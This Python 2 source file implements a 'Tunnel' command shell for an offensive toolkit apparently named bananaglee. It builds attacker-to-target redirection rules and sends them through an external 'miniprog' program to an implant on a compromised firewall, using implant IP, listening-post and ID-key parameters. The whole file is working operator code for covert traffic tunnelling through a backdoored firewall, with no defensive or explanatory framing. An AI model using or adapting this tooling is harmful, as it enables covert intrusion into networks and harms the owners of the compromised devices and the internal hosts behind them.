
import bananaglee
import tools
import shelve
import fw_logging
import os
import sys
import cmd
import subprocess
import shlex
import ConfigParser
import logging

class Tunnel(cmd.Cmd):

	def __init__(self,sfile,logger):
		cmd.Cmd.__init__(self)
		self.prompt = 'Tunnel>>'
	
		#shelve file
		self.sfile = sfile

		#set up logging
		name = 'tunnel'
		self.logger = logger

		#Parse config written by finder
		self.config = ConfigParser.ConfigParser()
		self.config.read(os.path.join(self.sfile['script_dir'],'tools.cfg'))
		self.sfile['miniprog'] = self.config.get('bananaglee'+self.sfile['version'],'miniprog')
		self.sfile['miniprog_dir'], tmp = os.path.split(self.sfile['miniprog'])
                
		if self.sfile.has_key('tunnel') == True:
                        if self.sfile['tunnel'] == True:
                                pass
                        else:
                                self.resetRule()
                else:
                        self.resetRule()
		
		if self.sfile.has_key('current_rule') == False:
			self.sfile['current_rule'] = {}
			self.logger.debug('did not find a rule that the user had previous')
		else:
			self.logger.info('Found a rule with the current settings')
			for i in self.sfile['current_rule']:
				self.logger.info(str(i) + ' : ' + str(self.sfile['current_rule'][i]))
		
		if self.sfile.has_key('persistent_rules') == False:
			self.sfile['persistent_rules'] = {}
		else:
			self.logger.debug('current persistent rules are: ' + str(self.sfile['persistent_rules']))

                try:
                        os.chdir(self.sfile['miniprog_dir'])
                except:
                        self.logger.exception('could to change dirs to the miniprog directory')

		#Pull out dict for tunnel
		self.logger.info('Starting tunnel module')
                self.logger.debug('LP IP: ' + str(self.sfile['lp']))
                self.logger.debug('Implant IP: ' + str(self.sfile['implant']))
                self.logger.debug('IDKey : ' + str(self.sfile['idkey']))
                self.logger.debug('Source Port: ' + str(self.sfile['sport']))
                self.logger.debug('Destination Port: ' + str(self.sfile['dport']))
                self.logger.debug('Log directory: ' + str(self.sfile['logs_to_process']))

		self.logRule()
		self.do_show_rule(' ')

		if self.sfile.has_key('rules') == False:
			self.sfile['rules'] = []

		if self.sfile['auto'] == True:
			if self.sfile['auto_start'] == True:
				if self.sfile['tunnels_dict'] == {}:
					self.logger.error('you specified --auto but I could not find your rules')
				else:
					tunnels = self.sfile['tunnels_dict']
					self.logger.debug(tunnels)
					keys = tunnels.keys()
					for i in keys:
						self.sfile['current_rule'] = tunnels[i]	
						self.logger.debug(tunnels[i])
						self.do_upload_rules(' ')
				tools.resetAuto(self.sfile,self.logger)
				sys.exit()	
			if self.sfile['auto_end'] == True:
				self.do_get_rules(' ')
				self.logger.info(self.sfile['rules'])
				for i in self.sfile['rules']:
					self.do_remove_rule(i)
                                self.do_get_rules(' ')
				bananaglee_mod = bananaglee.BananaGlee(self.sfile, self.logger)
                                bananaglee_mod.cmdloop()



        #used to not run last command when nothing is given
        def emptyline(self):
                pass

	def printStart(self):	
		if self.sfile['mode'] == 'simple':
			self.logger.info('                  ------------------Attacker------------------')
        	        self.logger.info('                         |                          ^')
                	self.logger.info('                         v                          |')
	                self.logger.info('     Attacker to Firewall Packet             Firewall to Attacker Packet')
			self.logger.info('     Source IP  :  attk_source               Source IP  :  attk_dest')
			self.logger.info('     Dest   IP  :  attk_dest                 Dest   IP  :  attk_source')
			self.logger.info('     Source Port:  attk_sport                Source Port:  attk_dport')
			self.logger.info('     Dest   Port:  attk_dport                Dest   Port:  attk_sport')
			self.logger.info('                         |                          ^')
			self.logger.info('                         v   Iface Num: attk_int    |')
			self.logger.info('          -------------------------Firewall-------------------------')
			self.logger.info('                         |   Iface Num: tgt_int     ^')
			self.logger.info('                         v                          |')
			self.logger.info('     Firewall to Target Packet               Target to Firewall Packet')
			self.logger.info('     Source IP  :  tgt_source                Source IP  :  tgt_dest')
			self.logger.info('     Dest   IP  :  tgt_dest                  Dest   IP  :  tgt_source')
			self.logger.info('     Source Port:  tgt_sport                 Source Port:  tgt_dport')
			self.logger.info('     Dest   Port:  tgt_dport                 Dest   Port:  tgt_sport')
			self.logger.info('                         |                          ^')
			self.logger.info('                         v                          |')
			self.logger.info('                 -------------------Target-------------------')
		elif self.sfile['mode'] == 'advanced':	#have not implemented advance yet
                        self.logger.info('                  ------------------Attacker------------------')
                        self.logger.info('                         |                          ^')
                        self.logger.info('                         v                          |')
                        self.logger.info('     Attacker to Firewall Packet             Firewall to Attacker Packet')
                        self.logger.info('     Source IP  :  attk_source               Source IP  :  rtn_attk_src')
                        self.logger.info('     Dest   IP  :  attk_dest                 Dest   IP  :  rtn_attk_dest')
                        self.logger.info('     Source Port:  attk_sport                Source Port:  rtn_attk_sport')
                        self.logger.info('     Dest   Port:  attk_dport                Dest   Port:  rtn_attk_dport')
                        self.logger.info('                         |                          ^')
                        self.logger.info('                         v   Iface Num: attk_int    |')
                        self.logger.info('          -------------------------Firewall-------------------------')
                        self.logger.info('                         |   Iface Num: tgt_int     ^')
                        self.logger.info('                         v                          |')
                        self.logger.info('     Firewall to Target Packet               Target to Firewall Packet')
                        self.logger.info('     Source IP  :  tgt_source                Source IP  :  rtn_tgt_source')
                        self.logger.info('     Dest   IP  :  tgt_dest                  Dest   IP  :  rtn_tgt_dest')
                        self.logger.info('     Source Port:  tgt_sport                 Source Port:  rtn_tgt_sport')
                        self.logger.info('     Dest   Port:  tgt_dport                 Dest   Port:  rtn_tgt_dport')
                        self.logger.info('                         |                          ^')
                        self.logger.info('                         v                          |')
                        self.logger.info('                 -------------------Target-------------------')

	def resetRule(self):
		self.logger.debug('resetig the dict for current rule')
		rule = {'attk_source' : '', 
			'attk_dest'   : '',
			'attk_sport'  : '0',
			'attk_dport'  : '0',
			'tgt_source'  : '',
			'tgt_dest'    : '',
			'tgt_sport'   : '0',
			'tgt_dport'   : '0',
			'attk_int'    : '',
			'tgt_int'     : '' }
		self.sfile['current_rule'] = rule
		self.logger.debug(self.sfile['current_rule'])

	#move to tools
	def opsec_check(self):
		pass

	def logRule(self):
		self.logger.debug('current rule information')
		self.logger.debug('attackers source: ' + str(self.sfile['current_rule']['attk_source']))
                self.logger.debug('attackers destination: ' + str(self.sfile['current_rule']['attk_dest']))
                self.logger.debug('attackers source port: ' + str(self.sfile['current_rule']['attk_sport']))
                self.logger.debug('attackers destination port: ' + str(self.sfile['current_rule']['attk_dport']))
                self.logger.debug('targets source: ' + str(self.sfile['current_rule']['tgt_source']))
                self.logger.debug('targets destination: ' + str(self.sfile['current_rule']['tgt_dest']))
                self.logger.debug('targets source port: ' + str(self.sfile['current_rule']['tgt_sport']))
                self.logger.debug('targets destination port: ' + str(self.sfile['current_rule']['tgt_dport']))
                self.logger.debug('attackers interface: ' + str(self.sfile['current_rule']['attk_int']))
                self.logger.debug('targets interface: ' + str(self.sfile['current_rule']['tgt_int']))

	def complete_create_tunnel(self, text, line, begidx, endidx):
		options = list(self.sfile['current_rule']) 
		return [i for i in options if i.startswith(text)]

	def do_create_tunnel(self, input):
		'''create_tunnel [options]
		will create a new tunnel options are the same as what was printed out in the ascii gui'''
		self.logger.debug('user is running create_tunnel')

		if input == '':
			self.logger.error('you did not provide any input')
			return
		else:
			options = input.split(' ')
			if len(options) < 0:
				self.logger.exception('you did not specify a variable and option')
				return
		
                rule = {'attk_source' : '',
                        'attk_dest'   : '',
                        'attk_sport'  : '0',
                        'attk_dport'  : '0',
                        'tgt_source'  : '',
                        'tgt_dest'    : '',
                        'tgt_sport'   : '0',
                        'tgt_dport'   : '0',
                        'attk_int'    : '',
                        'tgt_int'     : '' }

		c = 0
		for i in options:
			if i in rule:
				rule[i] = options[c + 1]
			c += 1
		
		self.sfile['current_rule'] = rule
		self.logger.debug(self.sfile['current_rule'])

        def complete_modify_tunnel(self, text, line, begidx, endidx):
                options = list(self.sfile['current_rule'])
		return [i for i in options if i.startswith(text)]

	def do_modify_tunnel(self, input):
		'''modify_tunnel [options]
                will modify the tunnel options are the same as what was printed out in the ascii gui'''
                self.logger.debug('user is running modify_tunnel')

                if input == '':
                        self.logger.error('you did not provide any input')
                        return
                else:
                        options = input.split(' ')
                        if len(options) < 0:
                                self.logger.exception('you did not specify a variable and option')
                                return

		rule = self.sfile['current_rule']

                c = 0
                for i in options:
                        if i in rule:
                                rule[i] = options[c + 1]
                        c += 1

                self.sfile['current_rule'] = rule
                self.logger.debug(self.sfile['current_rule'])

	def do_reset_rule(self,line):
		'''reset_rule
		clears the current settings for the tunnel rule'''
		self.resetRule()

	def do_upload_rules(self,line):
		'''upload_rules
		will upload your currently configured rule'''
		self.logger.debug('uploading rules')

		try:
			handles = self.sfile['packetToolkit']
			add_handle = handles['PD_addRuleHandler'] 
		except:
			self.logger.exception('could to get handle information for addRuleHandler')
			return
		
		if tools.checkTunnelRule(self.sfile, self.logger) == False:
			return

		#update ports

		self.logger.debug('upload rule checks passed, building rules')
		
		#Create rule file
		string_rule1 = '1 ' + str(self.sfile['current_rule']['attk_int']) + ' 0 2 ' + str(self.sfile['current_rule']['tgt_dest']) + ' ' + str(self.sfile['current_rule']['tgt_dport']) + ' ' + str(self.sfile['current_rule']['tgt_source']) + ' ' + str(self.sfile['current_rule']['tgt_sport']) + ' ' + str(self.sfile['current_rule']['tgt_int']) + ' 0 0 src host ' + str(self.sfile['current_rule']['attk_source']) + ' and dst host ' + str(self.sfile['current_rule']['attk_dest'])
		if self.sfile['current_rule']['attk_sport'] != '0':
			string_rule1 += ' and src port ' + str(self.sfile['current_rule']['attk_sport'])
		if self.sfile['current_rule']['attk_dport'] != '0':
			string_rule1 += ' and dst port ' + str(self.sfile['current_rule']['attk_dport'])
		string_rule1 += ' and (icmp or udp or tcp)'


		if self.sfile['mode'] == 'simple':
			string_rule2 = '2 ' + str(self.sfile['current_rule']['tgt_int']) + ' 0 2 ' + str(self.sfile['current_rule']['attk_source']) + ' ' + str(self.sfile['current_rule']['attk_sport']) + ' ' + str(self.sfile['current_rule']['attk_dest']) + ' ' + str(self.sfile['current_rule']['attk_dport']) + ' ' + str(self.sfile['current_rule']['attk_int']) + ' 0 0 src host ' + str(self.sfile['current_rule']['tgt_dest']) + ' and dst host ' + str(self.sfile['current_rule']['tgt_source'])
			if self.sfile['current_rule']['tgt_dport'] != '0':
				string_rule2 += ' and src port ' + str(self.sfile['current_rule']['tgt_dport'])
			if self.sfile['current_rule']['tgt_sport'] != '0':
				string_rule2 += ' and dst port ' + str(self.sfile['current_rule']['tgt_sport'])
			string_rule2 += ' and (icmp or udp or tcp)'

		temp_counter = 0
		found_file = False
		while found_file == False:
			if os.path.isfile(os.path.join(self.sfile['logs_to_process'],'tunnel' +str(temp_counter))) == True:
				temp_counter += 1
			else:
				tunnel_log_file = os.path.join(self.sfile['logs_to_process'],'tunnel' +str(temp_counter))
				found_file = True

		tunnel_file = file(tunnel_log_file,'a')
		tunnel_file.write(string_rule1)
		tunnel_file.write('\r\n')
		tunnel_file.write(string_rule2)
		tunnel_file.write('\r\n')
		tunnel_file.close()
		self.logger.debug('Rule: ' + str(string_rule1))
		self.logger.debug('Rule: ' + str(string_rule2))

		#open tunnel
		tunnel_number = tools.openTunnel(self.sfile, self.logger)

		#build command and run it	
		command = str(self.sfile['miniprog']) + ' --arg "' + str(os.path.join(self.sfile['logs_to_process'],tunnel_log_file)) + '" --name add_rule --cmd ' + str(add_handle) + ' --bsize 512 --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --logdir ' + str(self.sfile['logs_to_process'])
		add_rule = subprocess.Popen(shlex.split(command),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		output_stdout = add_rule.stdout.read()
                output_stderr = add_rule.stderr.read()
		self.logger.debug('Add rule command: ' + str(command))
		self.logger.debug('Add rule stdout: ' + str(output_stdout))
		self.logger.debug('Add rule stderr: ' + str(output_stderr))
		#looks like \r\m is not workint maybe use re instead
		for i in output_stderr.split('\n'):
			if 'Rule added' in i:
				self.logger.info(i)
				temp = self.sfile['rules']
				temp.append(i.split(': ')[-1])
				self.sfile['rules'] = temp
		#close tunnel
		tools.closeTunnel(self.sfile,tunnel_number,self.logger)

	def do_get_rules(self, line):
		'''get_rules
		gets current rules on firewall'''
		self.logger.info('getting current rules')
		#Gets the get handle from the dict and run command
		try:
			handles = self.sfile['packetToolkit']
			get_handle = handles['PD_getRulesHandler'] 
		except:
			self.logger.exception('could not get handle for getRulesHandler')

		#open tunnel
                tunnel_number = tools.openTunnel(self.sfile, self.logger)

		command = str(self.sfile['miniprog']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --logdir ' + str(self.sfile['logs_to_process']) + ' --name get_rules --cmd ' + str(get_handle)
		rules = subprocess.Popen(shlex.split(command),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		output_stdout = rules.stdout.read()
		output_stderr = rules.stderr.read()

		self.logger.debug('Get rules command: ' + str(command))
		self.logger.debug('Get rules stdout: ' + str(output_stdout))
		self.logger.debug('Get rules stderr: ' + str(output_stderr))		

		#close tunnel
                tools.closeTunnel(self.sfile,tunnel_number,self.logger)

		#Parse results and display to user
		if 'No reply' in output_stderr:
			self.logger.critical('could not talk to your tunnel module')
			return	
		else:
			rules = []
			for i in output_stdout.split('\n'):
				if 'ID' in i:
					rules.append(i.split(': ')[-1])
			self.logger.info('Current rules on firewall')
			for i in rules:
				self.logger.info(str(i))
			self.sfile['rules'] = rules
	def do_show_settins(self, line):
		'''print_shelve
		prints the contents of the shelve file'''
		self.logger.debug('running show_settings')
		tools.show_settings(self.sfile, option, self.logger)

	def complete_remove_rule(self, text, line, begidx, endidx):
		pass
	def do_remove_rule(self, id):
		'''remove_rule [ID]
		removes the rule with ID'''

		#Get the remove module handle
		try:	
			handles = self.sfile['packetToolkit']
			remove_handle = handles['PD_removeRuleHandler']
		except:
			self.logger.exception('could not get handle for removeRuleHandler')

		self.logger.debug('remove the rule with ID of: ' + str(id))
		#Check user input and then run the command
		if id == '':
			self.logger.error('you did not provide an ID')
			return
		elif id.isdigit() == False:
			self.logger.error('you did not provide a valid number for ID')
			return
		else:
			#update ports and open tunnel
	                tunnel_number = tools.openTunnel(self.sfile, self.logger)

			command = str(self.sfile['miniprog']) + ' --arg "' + str(id) + '" --name remove_rule --cmd ' + str(remove_handle) + ' --bsize 512 --idkey ' + str(self.sfile['idkey']) + ' --sport ' + str(self.sfile['sport']) + ' --dport ' + str(self.sfile['dport']) + ' --lp ' + str(self.sfile['lp']) + ' --implant ' + str(self.sfile['implant']) + ' --logdir ' + str(self.sfile['logs_to_process'])
			remove = subprocess.Popen(shlex.split(command),stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			output_stdout = remove.stdout.read()
			output_stderr = remove.stderr.read()
			
			self.logger.debug('Remove rule command: ' + str(command))
			self.logger.debug('Remove rule stdout: ' + str(output_stdout))
			self.logger.debug('Remove rule stderr: ' + str(output_stderr))
	
			#close tunnel
			tools.closeTunnel(self.sfile,tunnel_number,self.logger)
		
			#Parse output and display result to the user
			for i in output_stderr.split('\r\n'):
				if 'Rule NOT Removed, rule does not exist' in i:
					self.logger.error('the ID that you provided did not exist on the firewall')
				elif 'Rule Removed - Reply received' in i:
					print 'Removed rule ' + str(id)
					self.logger.info('removed rule')
				else:
					self.logger.error('some other output was recieved then what I expected')

	def do_attk_int(self, attk_int):
		'''attk_int [INTERFACE]
		INTERFACE that target is coming in on'''
		if attk_int.isdigit() == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['attk_int'] = attk_int
			self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed to attk_int ' + str(attk_int))
		else:
			self.logger.error('You did not enter a valid number')

	def do_tgt_int(self, tgt_int):
		'''tgt_int [INTERFACE]
		INTERFACE target is connected to'''
		if tgt_int.isdigit() == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['tgt_int'] = tgt_int
                        self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed tgt_int to ' + str(tgt_int))
		else:
			self.logger.error('You did not enter a valid number')

	def do_tgt_dport(self, tgt_dport):
		'''tgt_dport [PORT]
		destination PORT going to target'''
		if tools.checkPort(tgt_dport) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['tgt_dport'] = tgt_dport
                        self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed tgt_dport to: ' + str(tgt_dport))	
		elif str(tgt_dport.lower()) == 'rhp':
		        tunnel_dict = self.sfile['current_rule']
                        tunnel_dict['tgt_dport'] = tgt_dport
                        self.sfile['current_rule'] = tunnel_dict
                        self.logger.info('changed tgt_dport to: ' + str(tgt_dport))
		else:
			self.logger.error('The PORT you entered is not valid')

	def do_tgt_sport(self, tgt_sport):
		'''tgt_sport [PORT]
		source PORT going to target'''
		if tools.checkPort(tgt_sport) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['tgt_sport'] = tgt_sport
                        self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed tgt_sport to: ' + str(tgt_sport))
		elif str(tgt_sport.lower()) == 'rhp':
			tunnel_dict = self.sfile['current_rule']
                        tunnel_dict['tgt_sport'] = tgt_sport
                        self.sfile['current_rule'] = tunnel_dict
                        self.logger.info('changed tgt_sport to: ' + str(tgt_sport))
		else:
			self.logger.error('The PORT you entered is not valid')

	def do_tgt_dest(self, tgt_dest):
		'''tgt_dest [IP]
		targets IP'''
		if tools.checkIP(tgt_dest) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['tgt_dest'] = tgt_dest
			self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed tgt_dest to: ' + str(tgt_dest))
		else:
                        self.logger.error('The IP you entered is not valid')

	def do_tgt_source(self, tgt_source):
		'''tgt_source [IP]
		source IP of target (what IP the target will see)'''
		if tools.checkIP(tgt_source) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['tgt_source'] = tgt_source
                        self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed tgt_source to ' + str(tgt_source))
		else:
                        self.logger.error('The IP you entered is not valid')

	def do_attk_dport(self, attk_dport):
		'''attk_dport [PORT]
		destination PORT of attacker'''
		if tools.checkPort(attk_dport) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['attk_dport'] = attk_dport
			self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed attk_dport to ' + str(attk_dport))
		elif str(attk_dport.lower()) == 'rhp':
		        tunnel_dict = self.sfile['current_rule']
                        tunnel_dict['attk_dport'] = attk_dport
                        self.sfile['current_rule'] = tunnel_dict
                        self.logger.info('changed attk_dport to ' + str(attk_dport))
		else:
			self.logger.error('The PORT you entered is not valid')

	def do_attk_sport(self, attk_sport):
		'''attk_sport [PORT]
		source PORT of attacker'''
		if tools.checkPort(attk_sport) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['attk_sport'] = attk_sport
                        self.sfile['current_rule'] = tunnel_dict
                        self.logger.debug('changed attk_sport to ' + str(attk_sport))
		elif str(attk_sport.lower()) == 'rhp':
                        tunnel_dict = self.sfile['current_rule']
                        tunnel_dict['attk_sport'] = attk_sport
                        self.sfile['current_rule'] = tunnel_dict
                        self.logger.info('changed attk_sport to ' + str(attk_sport))
		else:
			self.logger.info('The PORT you entered is not valid')

	def do_attk_dest(self, attk_dest):
		'''attk_dest [IP]
		IP destination of attacker'''
		if tools.checkIP(attk_dest) == True:
                        tunnel_dict = self.sfile['current_rule']
			tunnel_dict['attk_dest'] = attk_dest
                        self.sfile['current_rule'] = tunnel_dict
			self.logger.debug('changed attk_dest to ' + str(attk_dest))
		else:
			self.logger.error('The IP you entered is not valid')
	
	def do_attk_source(self, attk_source):
		'''attk_source [IP]
		IP of attacker'''
		if tools.checkIP(attk_source) == True:
			tunnel_dict = self.sfile['current_rule']
			tunnel_dict['attk_source'] = attk_source
			self.sfile['current_rule'] = tunnel_dict	
			self.logger.debug('changed attk_source to ' + str(attk_source))
		else:
			self.logger.error('The IP you entered is not valid')


	def do_show_rule(self, line):
		'''print
		prints out the current tunnel rule'''
		self.logger.debug('printing rules out for user')
		if self.sfile['mode'] == 'simple':
			self.logger.info('                  ------------------Attacker------------------')
			self.logger.info('                         |                          ^')
			self.logger.info('                         v                          |')
			self.logger.info('     Attacker to Firewall Packet             Firewall to Attacker Packet')
			logging_string = '     Source IP  :  '
			if self.sfile['current_rule']['attk_source'] == '':
				logging_string += 'attk_source' + ' ' * (26 - len('attk_source'))
			else:
				logging_string += str(self.sfile['current_rule']['attk_source'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['attk_source'])))
			logging_string += 'Source IP  :  '
			if self.sfile['current_rule']['attk_dest'] == '':
				logging_string += 'attk_dest' 
			else:
				logging_string += str(self.sfile['current_rule']['attk_dest'])
			self.logger.info(str(logging_string))

			#NewLine
			logging_string = '     Dest   IP  :  '
			if self.sfile['current_rule']['attk_dest'] == '':
				logging_string += 'attk_dest' + ' ' * (26 - len('attk_dest'))
			else:
				logging_string += str(self.sfile['current_rule']['attk_dest'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['attk_dest'])))
			logging_string += 'Dest   IP  :  '
			if self.sfile['current_rule']['attk_source'] == '':
				logging_string += 'attk_source'
			else:
				logging_string += str(self.sfile['current_rule']['attk_source'])
                        self.logger.info(str(logging_string))

			#NewLine
			logging_string = '     Source Port:  '
			if self.sfile['current_rule']['attk_sport'] == '0':
				logging_string += 'attk_sport' + ' ' * (26 - len('attk_sport'))
			else:
				logging_string += str(self.sfile['current_rule']['attk_sport'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['attk_sport'])))
			logging_string += 'Source Port:  '
			if self.sfile['current_rule']['attk_dport'] == '0':
				logging_string += 'attk_dport'
			else:
				logging_string += str(self.sfile['current_rule']['attk_dport'])
                        self.logger.info(str(logging_string))

			#Newline
			logging_string = '     Dest   Port:  '
			if self.sfile['current_rule']['attk_dport'] == '0':
				logging_string += 'attk_dport' + ' ' * (26 - len('attk_dport'))
			else:
				logging_string += str(self.sfile['current_rule']['attk_dport'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['attk_dport'])))
			logging_string += 'Dest   Port:  '
			if self.sfile['current_rule']['attk_sport'] == '0':
				logging_string += 'attk_sport'
			else:
				logging_string += str(self.sfile['current_rule']['attk_sport'])
                        self.logger.info(str(logging_string))

                        #NewLine
			self.logger.info('                         |                          ^')

			#newline
			logging_string = '                         v   Iface Num: '
			if self.sfile['current_rule']['attk_int'] == '':
				logging_string += 'attk_int' + ' ' * (12 - len('attk_int'))
			else:
				logging_string += str(self.sfile['current_rule']['attk_int'])
				logging_string += ' ' * (12 - len(str(self.sfile['current_rule']['attk_int'])))
			logging_string += '|'
                        self.logger.info(str(logging_string))

                        #Newline
			self.logger.info('          -------------------------Firewall-------------------------')

			#newline
			logging_string = '                         |   Iface Num: '
			if self.sfile['current_rule']['tgt_int'] == '':
				logging_string += 'tgt_int' + ' ' * (12 -len ('tgt_int'))
			else:
				logging_string += str(self.sfile['current_rule']['tgt_int'])
				logging_string += ' ' * (12 - len(str(self.sfile['current_rule']['tgt_int'])))
			logging_string += '^'
			self.logger.info(str(logging_string))

                        #NewLine
			self.logger.info('                         v                          |')

			#newline
			self.logger.info('     Firewall to Target Packet               Target to Firewall Packet')

			#newline
			logging_string = '     Source IP  :  '
			if self.sfile['current_rule']['tgt_source'] == '':
				logging_string += 'tgt_source' + ' ' * (26 - len('tgt_source'))
			else:
				logging_string += str(self.sfile['current_rule']['tgt_source'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['tgt_source'])))
			logging_string += 'Source IP  :  '
			if self.sfile['current_rule']['tgt_dest'] == '':
				logging_string += 'tgt_dest'
			else:
				logging_string += str(self.sfile['current_rule']['tgt_dest'])
			self.logger.info(str(logging_string))

			#Newline
			logging_string = '     Dest   IP  :  '
			if self.sfile['current_rule']['tgt_dest'] == '':
				logging_string += 'tgt_dest' + ' ' * (26 - len('tgt_dest'))
			else:
				logging_string += str(self.sfile['current_rule']['tgt_dest'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['tgt_dest'])))
			logging_string += 'Dest   IP  :  '
			if self.sfile['current_rule']['tgt_source'] == '':
				logging_string += 'tgt_source'
			else:
				logging_string += str(self.sfile['current_rule']['tgt_source'])
                        self.logger.info(str(logging_string))

			#Newline
			logging_string = '     Source Port:  '
			if self.sfile['current_rule']['tgt_sport'] == '0':
				logging_string += 'tgt_sport' + ' ' * (26 - len('tgt_sport'))
			else:
				logging_string += str(self.sfile['current_rule']['tgt_sport'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['tgt_sport'])))
			logging_string += 'Source Port:  '
			if self.sfile['current_rule']['tgt_dport'] == '0':
				logging_string += 'tgt_dport'
			else:
				logging_string += str(self.sfile['current_rule']['tgt_dport'])
                        self.logger.info(str(logging_string))

			#Newline
			logging_string = '     Dest   Port:  '
			if self.sfile['current_rule']['tgt_dport'] == '0':
				logging_string += 'tgt_dport' + ' ' * (26 - len('tgt_dport'))
			else:
				logging_string += str(self.sfile['current_rule']['tgt_dport'])
				logging_string += ' ' * (26 - len(str(self.sfile['current_rule']['tgt_dport'])))
			logging_string += 'Dest   Port:  '
			if self.sfile['current_rule']['tgt_sport'] == '0':
				logging_string += 'tgt_sport'
			else:
				logging_string += str(self.sfile['current_rule']['tgt_sport'])
                        self.logger.info(str(logging_string))

                        #Newline
			self.logger.info('                         |                          ^')
			self.logger.info('                         v                          |')
			self.logger.info('                 -------------------Target-------------------')
	
	def do_exit(self, line):
		'''exit - exits the script'''
                self.logger.debug(str(self.sfile))
                self.sfile['tunnel'] = 'False'
                self.logger.debug('exiting')
		sys.exit()

        def do_quit(self, line):
                '''quit - quits tunnel'''
                self.logger.debug(str(self.sfile))
		self.sfile['tunnel'] = 'False'
		self.logger.debug('exiting')
		return True


